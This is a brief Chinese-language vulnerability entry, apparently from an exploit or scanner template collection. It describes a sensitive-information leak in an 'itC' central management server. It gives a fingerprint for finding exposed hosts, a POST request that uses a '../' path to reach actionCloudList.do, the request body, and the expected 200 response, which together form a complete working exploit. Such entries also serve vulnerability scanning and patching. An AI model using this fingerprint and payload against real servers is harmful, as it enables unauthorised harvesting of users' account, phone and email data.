# itC中心管理服务器actionCloudList存在敏感信息泄露漏洞

itC ｜ 信息泄露 ｜ —
- **指纹**：`body="/mt_res_v3/img/public/logo.ico"`
- **请求**：`POST /sdk/../vcs/actionCloudList.do HTTP/1.1`

**Payload**
```
status=-1&platform=-1&account=&name=&phone_email=&size=19&ep_id=
```
- **响应特征**：200